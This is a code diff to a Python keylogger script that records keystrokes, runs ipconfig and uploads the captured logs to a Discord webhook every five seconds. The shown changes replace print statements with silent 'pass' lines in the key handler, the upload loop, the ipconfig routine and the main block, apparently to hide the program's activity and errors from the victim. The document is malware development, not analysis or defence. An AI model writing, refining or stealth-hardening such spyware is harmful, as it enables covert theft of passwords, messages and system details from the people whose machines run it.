@@ -78,7 +78,7 @@ def on_press(key):
                 f.write(f" [{key}] ")  # Log special keys (Enter, Shift, etc.)
 
     except Exception as e:
-        print(f"Error: {e}")
+        pass
 
 # Upload function to Discord webhook
 def upload_file_to_webhook(file_path, webhook_url):
@@ -103,7 +103,7 @@ def upload_file_to_webhook(file_path, webhook_url):
 # Upload every 5 seconds
 def upload_every_5_seconds(file_path, webhook_url):
     while True:
-        print("")
+        pass
         upload_file_to_webhook(file_path, webhook_url)
         time.sleep(5)
 
@@ -116,10 +116,10 @@ def run_ipconfig():
             # Write the output to the ipconfig.txt file
             with open(file_pathip, 'w') as file:
                 file.write(result.stdout)
-                print("")
+                pass
 
         except Exception as e:
-            print(f"Error: {e}")
+            pass
         
         time.sleep(5)
 
@@ -203,7 +203,7 @@ if __name__ == "__main__":
     
     # If 'yes' is True, do nothing (counter is not shown)
     else:
-        print("")
+        pass
 
 
 
